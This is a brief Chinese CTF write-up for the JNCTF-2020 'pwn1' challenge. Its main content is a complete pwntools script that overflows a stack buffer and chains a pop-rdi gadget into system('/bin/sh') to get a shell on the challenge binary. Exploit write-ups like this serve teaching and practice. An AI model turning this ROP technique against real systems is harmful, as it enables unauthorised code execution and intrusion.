# JNCTF-2020 : jnctf_2020_pwn1

## **【原理】**
基础栈溢出

## **【目的】**
getshell

## **【环境】**
Ubuntu 16.04

## **【工具】**
Pwntools,ida

## **【步骤】**


```python
from pwn import*
context.log_level = 'debug'
#p = remote('',)
p = process('./jnctf_2020_pwn1')
elf = ELF('./jnctf_2020_pwn1')
system = elf.plt['system']
prdi = 0x400903
#gdb.attach(p,'b *0x40085F')
payload = '/bin/sh'.ljust(0x30,'\x00') + p64(0x1000)
p.sendafter('>>\n',payload)
payload = 'a'*0x28+p64(prdi)+p64(0x6010a0) +p64(system)
p.sendafter('name:\n',payload)
p.interactive()

```



## **【总结】**
签到pwn
